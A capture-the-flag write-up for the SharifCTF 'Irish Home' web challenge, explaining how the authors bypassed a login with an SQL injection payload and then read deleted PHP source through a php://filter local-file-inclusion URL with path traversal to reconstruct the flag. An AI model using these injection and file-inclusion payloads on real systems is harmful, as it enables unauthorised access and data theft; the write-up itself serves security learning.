<h2>Irish Home (Web-200)</h2>

<h3>Description</h3>

<p>Login, and recover the deleted flag. </p>

<h3>Solution</h3>

<p>This challenge is solved by me and @nikhil96sher(Nikhil Sheorem)
The site (http://ctf.sharif.edu:8082/login.php) is vulnearable to sql injection.
But they have applied filters on the <code>"</code>.
So I used username = <code>\</code> and password = <code>OR 1=1;#</code> and I was able to login as <strong>admin</strong>.
Now I was kinda stuck unless @nikhil96sher pointed out that it is vulnearable to LFI as well.
Using <code>http://ctf.sharif.edu:8082/pages/show.php?page=php://filter/read=convert.base64-encode/resource=../delete</code>, we got 
```
<?php
require_once('header.php');</p>

<p>/*
if(isset($<em>GET['page'])) {
    $fname = $</em>GET['page'] . ".php";
    $fpath = "pages/$fname";
    if(file<em>exists($fpath)) {
        rename($fpath, "deleted</em>3d5d9c1910e7c7/$fname");
    }
}
*/</p>

<p>?></p>

<div style="text-align: center;">
<h3 style="color: red;">Site is under maintenance 'til de end av dis f$#!*^% SharifCTF.</h3><br/>
<h4><b>Al' destructive acshuns are disabled!</b></h4>
</div>

<p><?php
require_once('footer.php');
?></p>

<p>```</p>

<p>After that using <code>http://ctf.sharif.edu:8082/pages/show.php?page=php://filter/read=convert.base64-encode/resource=../deleted_3d5d9c1910e7c7/flag</code>, we got 
```
$username = 'Cuchulainn';
$password = ;    // Oi don't save me bleedin password in a shithole loike dis.</p>

<p>$salt = 'd34340968a99292fb5665e';</p>

<p>$tmp = $username . $password . $salt;
$tmp = md5($tmp);</p>

<p>$flag = "SharifCTF{" . $tmp . "}";
echo $flag;</p>

<p>```</p>

<p>Now using the <a href="./web-200.py">script</a>, we were able to brute-force password.
So this was the challenge which had all fruits in the basket, we had sqli, LFI, path transversal, blind sqli. </p>
